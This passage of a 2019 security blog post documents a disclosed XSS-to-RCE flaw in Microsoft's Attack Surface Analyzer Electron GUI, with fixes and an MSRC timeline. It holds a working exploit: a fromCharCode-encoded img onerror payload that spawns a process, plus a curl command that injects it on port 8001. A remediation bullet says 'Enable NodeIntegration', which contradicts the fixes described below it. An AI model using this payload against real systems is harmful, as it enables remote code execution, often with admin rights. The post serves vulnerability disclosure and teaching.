</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#268bd2>function</span> GetCollectors() {
</span></span><span style=display:flex><span>    $.getJSON(<span style=color:#2aa198>&#39;GetCollectors&#39;</span>, <span style=color:#268bd2>function</span> (result) {
</span></span><span style=display:flex><span>        <span style=color:#268bd2>var</span> data <span style=color:#719e07>=</span> JSON.parse(result);
</span></span><span style=display:flex><span>        <span style=color:#268bd2>var</span> rundata <span style=color:#719e07>=</span> data.Runs;
</span></span><span style=display:flex><span>        <span style=color:#268bd2>var</span> keepChecking <span style=color:#719e07>=</span> <span style=color:#cb4b16>false</span>;
</span></span><span style=display:flex><span>        <span style=color:#268bd2>var</span> anyCollectors <span style=color:#719e07>=</span> <span style=color:#cb4b16>false</span>;
</span></span><span style=display:flex><span>        <span style=color:#268bd2>var</span> icon, midword;
</span></span><span style=display:flex><span>        $(<span style=color:#2aa198>&#39;#ScanStatus&#39;</span>).empty();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#719e07>if</span> (<span style=color:#b58900>Object</span>.keys(rundata).length <span style=color:#719e07>&gt;</span> <span style=color:#2aa198>0</span>) {
</span></span><span style=display:flex><span>            <span style=color:#586e75>// INJECTION
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>            $(<span style=color:#2aa198>&#39;#ScanStatus&#39;</span>).append($(<span style=color:#2aa198>&#39;&lt;div/&gt;&#39;</span>, { html<span style=color:#719e07>:</span> l(<span style=color:#2aa198>&#34;%StatusReportFor&#34;</span>) <span style=color:#719e07>+</span> data.RunId <span style=color:#719e07>+</span> <span style=color:#2aa198>&#34;.&lt;/i&gt;&#34;</span> }));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#586e75>// Removed
</span></span></span><span style=display:flex><span><span style=color:#586e75></span>    });
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>There's no input validation or output encoding for <code>data.RunId</code>. Interestingly,
the IDs appear output encoded in the <code>Result</code> tab. Not being
<a href=https://twitter.com/lewisardern target=_blank rel="noreferrer noopener">Lewis Ardern</a> (solid 5/7 JavaScript guy), I am glad this simple
payload worked.</p><h2 id=xss-in-guest-from-remote-payloads>XSS in Guest from Remote Payloads
<a class=header-link href=#xss-in-guest-from-remote-payloads><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>We have this reflected XSS which is pretty much worthless. Ok, not completely
worthless. If an attacker can make you click on a link to <code>localhost:8001</code> and
submit a payload, they can get XSS in your ASA/browser inside the VM. Not really
<em>that useful</em>.</p><p>But it gets better because the XSS persists in the guest VM running the ASA
Electron app. Without submitting a new run, navigate to the <code>Scan</code> tab (or click
on it again) in ASA's Electron app inside the guest VM and you should see the
alert.</p><p><img src=07-xss-in-asa-guest.png alt="XSS in ASA in guest VM"></p><p>When you navigate to the <code>Scan</code> tab, the application retrieves the information
for the latest submitted run (the one we submitted from host VM) and the
injected payload is executed. This means an attacker can connect to the app via
port <code>8001</code>, submit XSS and then it will pop in ASA when we use it locally.</p><h1 id=vuln-3-xss-to-rce-via-nodeintegration>Vuln 3: XSS to RCE via NodeIntegration
<a class=header-link href=#vuln-3-xss-to-rce-via-nodeintegration><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Being Electron, I immediately thought of RCE. There are a lot of write-ups about
how you can convert an XSS to RCE in Electron. It's easy when <code>NodeIntegration</code>
is enabled which is the case for Electron.NET
(<a href=https://github.com/ElectronNET/Electron.NET/blob/3cb92169dd1fc4ca917e1a48551192038f68bbec/ElectronNET.API/Entities/WebPreferences.cs#L18 target=_blank rel="noreferrer noopener">link to the current commit</a>):</p><figure class=code><figcaption><span>WebPreferences.cs</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cs data-lang=cs><span style=display:flex><span><span style=color:#719e07>/// &lt;summary&gt;</span>
</span></span><span style=display:flex><span><span style=color:#719e07>/// Whether node integration is enabled. Default is true.</span>
</span></span><span style=display:flex><span><span style=color:#719e07>/// &lt;/summary&gt;</span>
</span></span><span style=display:flex><span>[DefaultValue(true)]
</span></span><span style=display:flex><span><span style=color:#268bd2>public</span> <span style=color:#dc322f>bool</span> NodeIntegration { <span style=color:#719e07>get</span>; <span style=color:#719e07>set</span>; } = <span style=color:#cb4b16>true</span>;</span></span></code></pre></td></tr></table></div></div></div></figure><p>More info:</p><ul><li><a href=https://github.com/electron/electron/blob/master/docs/tutorial/security.md#2-do-not-enable-nodejs-integration-for-remote-content target=_blank rel="noreferrer noopener">Electron Security - Do not enable Node.js Integration for Remote Content</a></li></ul><p>This means we can use the XSS to spawn processes in the guest VM running ASA.
Note that there are <code>NodeIntegration</code> bypasses so just disabling it might not be
enough.</p><h3 id=the-rce-payload>The RCE Payload
<a class=header-link href=#the-rce-payload><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>It's the typical <code>Electron XSS to RCE</code> payload. Google one and use it.</p><figure class=code><figcaption><span>XSS to RCE Payload</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">9
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#268bd2>var</span> Process <span style=color:#719e07>=</span> process.binding(<span style=color:#2aa198>&#39;process_wrap&#39;</span>).Process;
</span></span><span style=display:flex><span><span style=color:#268bd2>var</span> proc <span style=color:#719e07>=</span> <span style=color:#719e07>new</span> Process();
</span></span><span style=display:flex><span>proc.onexit <span style=color:#719e07>=</span> <span style=color:#268bd2>function</span>(a,b) {};
</span></span><span style=display:flex><span><span style=color:#268bd2>var</span> env <span style=color:#719e07>=</span> process.env;
</span></span><span style=display:flex><span><span style=color:#268bd2>var</span> env_ <span style=color:#719e07>=</span> [];
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> (<span style=color:#268bd2>var</span> key <span style=color:#719e07>in</span> env) env_.push(key<span style=color:#719e07>+</span><span style=color:#2aa198>&#39;=&#39;</span><span style=color:#719e07>+</span>env[key]);
</span></span><span style=display:flex><span>proc.spawn({file<span style=color:#719e07>:</span><span style=color:#2aa198>&#39;calc.exe&#39;</span>,args<span style=color:#719e07>:</span>[],cwd<span style=color:#719e07>:</span><span style=color:#cb4b16>null</span>,windowsVerbatimArguments<span style=color:#719e07>:</span><span style=color:#cb4b16>false</span>,
</span></span><span style=display:flex><span>    detached<span style=color:#719e07>:</span><span style=color:#cb4b16>false</span>,envPairs<span style=color:#719e07>:</span>env_,stdio<span style=color:#719e07>:</span>[{type<span style=color:#719e07>:</span><span style=color:#2aa198>&#39;ignore&#39;</span>},{type<span style=color:#719e07>:</span><span style=color:#2aa198>&#39;ignore&#39;</span>},
</span></span><span style=display:flex><span>    {type<span style=color:#719e07>:</span><span style=color:#2aa198>&#39;ignore&#39;</span>}]});</span></span></code></pre></td></tr></table></div></div></div></figure><p>Use the <a href=https://eve.gd/2007/05/15/javascript-eval-string-fromcharcode-encoder/ target=_blank rel="noreferrer noopener">JavaScript eval String.fromCharCode encoder</a> to convert
it to the following. Then submit a new run with the payload as the <code>Run Id</code> from
the browser in the host machine (note that I have added a bogus <code>id</code> element to
make each payload unique):</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#268bd2>img</span> id<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;5&#34;</span> src<span style=color:#719e07>=</span><span style=color:#2aa198>x</span> onerror<span style=color:#719e07>=</span><span style=color:#2aa198>eval(String.fromCharCode(118,97,114,32,80,114,111,99,</span>
</span></span><span style=display:flex><span>101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,
</span></span><span style=display:flex><span>40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,
</span></span><span style=display:flex><span>115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,
</span></span><span style=display:flex><span>99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,
</span></span><span style=display:flex><span>102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,
</span></span><span style=display:flex><span>101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,
</span></span><span style=display:flex><span>32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,
</span></span><span style=display:flex><span>121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,
</span></span><span style=display:flex><span>101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,
</span></span><span style=display:flex><span>115,112,97,119,110,40,123,102,105,108,101,58,39,99,97,108,99,46,101,120,101,39,
</span></span><span style=display:flex><span>44,97,114,103,115,58,91,93,44,99,119,100,58,110,117,108,108,44,119,105,110,100,
</span></span><span style=display:flex><span>111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,
</span></span><span style=display:flex><span>102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,
</span></span><span style=display:flex><span>101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,
</span></span><span style=display:flex><span>123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,
</span></span><span style=display:flex><span>58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,
</span></span><span style=display:flex><span>111,114,101,39,125,93,125,41,59))&gt;
</span></span></code></pre></div><p>You can also submit the payload locally via this curl command:</p><pre tabindex=0><code>curl -vvv -ik -H &#34;Host:localhost:8001&#34; &#34;http://localhost:8001/Home/StartCollection?
Id=&lt;img%20id=%225%22%20src=x%20onerror=eval(String.fromCharCode(118,97,114,32,80,
114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,
110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,
101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,
99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,
117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,
118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,
110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,
105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,
39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,
119,110,40,123,102,105,108,101,58,39,99,97,108,99,46,101,120,101,39,44,97,114,103,
115,58,91,93,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,
101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,
101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,
105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,
58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,
114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,
41,59))&gt;&amp;File=false&amp;Port=false&amp;Service=false&amp;User=false&amp;Registry=false&amp;Certificates=true&#34;
</code></pre><p>Switch back to the <code>Scan</code> tab (or click on it to reload it if it's already open)
in the guest VM and see <code>calc</code> pop up.</p><span class=caption-wrapper><img class=caption src=08-calc-in-vm.png title="Calc in guest VM" alt="Calc in guest VM">
<span class=caption-text>Calc in guest VM</span></span><p>Incidentally, the command line value in procmon for running the calc looks like a kaomoji.</p><span class=caption-wrapper><img class=caption src=09-calc-procmon.png title="Calc in procmon" alt="Calc in procmon">
<span class=caption-text>Calc in procmon</span></span><h3 id=funky-gifs>Funky Gifs
<a class=header-link href=#funky-gifs><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>Injecting the payload from VM host:</p><span class=caption-wrapper><img class=caption src=10-test-run.gif title="Injecting from host into guest" alt="Injecting from host into guest">
<span class=caption-text>Injecting from host into guest</span></span><p>Injecting the payload locally:</p><span class=caption-wrapper><img class=caption src=11-localhost.gif title="Localhost and curl" alt="Localhost and curl">
<span class=caption-text>Localhost and curl</span></span><h1 id=the-good-and-the-bad>The Good and the Bad
<a class=header-link href=#the-good-and-the-bad><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p><strong>[+]</strong> ASA is usually run as Admin. This allows ASA to have more visibility into the
OS and give us better results. This means our RCE is as admin.<br><strong>[+]</strong> The ports are usually <code>8000</code> and <code>8001</code>. Unless you are running
something else on those ports, it's easy to discover machines running a
vulnerable version of the ASA.<br><strong>[-]</strong> ASA is usually run in disposable VMs. You are not going to fingerprint
your applications on a prod VM. But these VMs are still connected to something.</p><h1 id=how-can-we-fix-this>How Can We Fix This?
<a class=header-link href=#how-can-we-fix-this><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><ol><li>Don't bind the web server to all interfaces.</li><li>Output encode <code>Run Id</code>s in the progress page.</li><li>Enable <code>NodeIntegration</code> and other Electron Defenses in Electron.NET.<ul><li>See <a href=https://github.com/electron/electron/blob/master/docs/tutorial/security.md target=_blank rel="noreferrer noopener">Security, Native Capabilities, and Your Responsibility</a>.</li></ul></li></ol><p>The issue was reported to <a href=https://msrc.microsoft.com/ target=_blank rel="noreferrer noopener">Microsoft Security Response Center</a> on May
22nd 2019.</p><h2 id=fixes>Fixes
<a class=header-link href=#fixes><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><ul><li><code>NodeIntegration</code> disabled and <code>ContextIsolation</code> enabled: <a href=https://github.com/microsoft/AttackSurfaceAnalyzer/pull/218 target=_blank rel="noreferrer noopener">#218</a></li><li>Not listening on all interfaces - in
<a href=https://github.com/microsoft/AttackSurfaceAnalyzer/blob/37bce60e86e1d727970be6e5aa6ba1a1d8083b35/Gui/Properties/launchSettings.json#L30 target=_blank rel="noreferrer noopener">Gui/Properties/launchSettings.json</a>: <a href=https://github.com/microsoft/AttackSurfaceAnalyzer/pull/220 target=_blank rel="noreferrer noopener">#220</a></li><li><code>encodeURIComponent</code> the <code>runId</code> - in
<a href=https://github.com/microsoft/AttackSurfaceAnalyzer/blob/3dec668982b513f92cb9bc8a00ff57fdaada14da/Gui/wwwroot/js/Collect.js#L59-L98 target=_blank rel="noreferrer noopener">Gui/wwwroot/js/Collect.js</a>: <a href=https://github.com/microsoft/AttackSurfaceAnalyzer/pull/220 target=_blank rel="noreferrer noopener">#220</a></li></ul><h1 id=timeline>Timeline
<a class=header-link href=#timeline><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><table><thead><tr><th style=text-align:left>What Happened</th><th style=text-align:left>When</th></tr></thead><tbody><tr><td style=text-align:left>Report</td><td style=text-align:left>22 May 2019</td></tr><tr><td style=text-align:left>Acknowledgement</td><td style=text-align:left>22 May 2019</td></tr><tr><td style=text-align:left>MSRC asked for clarification</td><td style=text-align:left>28 May 2019</td></tr><tr><td style=text-align:left>MSRC confirmed fix was applied</td><td style=text-align:left>06 June 2019</td></tr><tr><td style=text-align:left>Fix was confirmed</td><td style=text-align:left>14 June 2019</td></tr><tr><td style=text-align:left>Disclosure</td><td style=text-align:left>18 June 2019</td></tr></tbody></table></div><footer><p class=meta><span class="byline author vcard">Posted by <span class=fn>Parsia</span></span>
<time>Jun 18, 2019</time></span></p><p class=meta><a class="basic-alignment left" href=https://parsiya.net/blog/2019-04-28-thick-client-proxying-part-9-the-windows-dns-cache/ title="Thick Client Proxying - Part 9 - The Windows DNS Cache">Thick Client Proxying - Part 9 - The Windows DNS Cache</a>
<a class="basic-alignment right" href=https://parsiya.net/blog/2019-07-28-disabling-cascade-fans-beep/ title="Disabling Cascade Fan's Beep">Disabling Cascade Fan's Beep</a></p><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//parsiya.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></footer></article></div><aside class="sidebar thirds"><section class="first odd"><h1>Who am I?</h1><p><p>I am Parsia, an application security engineer.</p><p>I write about application security, cryptography, static analysis, and
(of course) videogames.</p><p>Click on <a href=/about/>About Me!</a> to know more.</p></p></section><ul class=sidebar-nav><li class=sidebar-nav-item><a target=_blank rel="me noopener noreferrer" href=https://infosec.exchange/@parsiya title=https://infosec.exchange/@parsiya><i class="fa fa-mastodon fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://github.com/parsiya/ title=https://github.com/parsiya/><i class="fa fa-github fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://twitter.com/cryptogangsta/ title=https://twitter.com/cryptogangsta/><i class="fa fa-twitter fa-3x"></i></a>
<a target=_blank rel="noopener noreferrer" href=https://www.linkedin.com/in/parsiya title=https://www.linkedin.com/in/parsiya><i class="fa fa-linkedin fa-3x"></i></a></li></ul><section class=odd><h1>Collections</h1><li><a href=https://parsiya.net/categories/thick-client-proxying/ title="Thick Client Proxying">Thick Client Proxying</a></li><li><a href=https://parsiya.net/categories/writeup/ title=CTFs/Writeups>CTFs/Writeups</a></li><li><a href=https://parsiya.net/categories/attack-surface-analysis/ title="Attack Surface Analysis">Attack Surface Analysis</a></li><li><a href=https://parsiya.net/categories/static-analysis/ title="Static Analysis">Static Analysis</a></li><li><a href=https://parsiya.net/categories/bug-bounty/ title="Bug Bounty">Bug Bounty</a></li><li><a href=https://parsiya.net/categories/blockchain/ title="Blockchain (lol)">Blockchain (lol)</a></li><li><a href=https://parsiya.net/categories/crypto/ title=Crypto(graphy)>Crypto(graphy)</a></li><li><a href=https://parsiya.net/categories/burp-extension/ title="Burp Extension Development">Burp Extension Development</a></li><li><a href=https://parsiya.net/categories/automation/ title=Automation>Automation</a></li><li><a href=https://parsiya.net/categories/reverse-engineering/ title="Reverse Engineering">Reverse Engineering</a></li><li><a href=https://parsiya.net/categories/winappdbg/ title="WinAppDbg (use Frida instead)">WinAppDbg (use Frida instead)</a></li><li><a href=https://awsome.pw title='AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability'>AWSome.pw - S3 bucket squatting - my very "legit" branded vulnerability</a></li></section></aside></div></div><footer role=contentinfo><p>Copyright &copy; 2024 Parsia - <a href=https://parsiya.net/license/>License</a> -
<span class=credit>Powered by <a target=_blank href=https://gohugo.io rel="noopener noreferrer">Hugo</a> and <a target=_blank href=https://github.com/parsiya/hugo-octopress/ rel="noopener noreferrer">Hugo-Octopress</a> theme.</p></footer></body></html>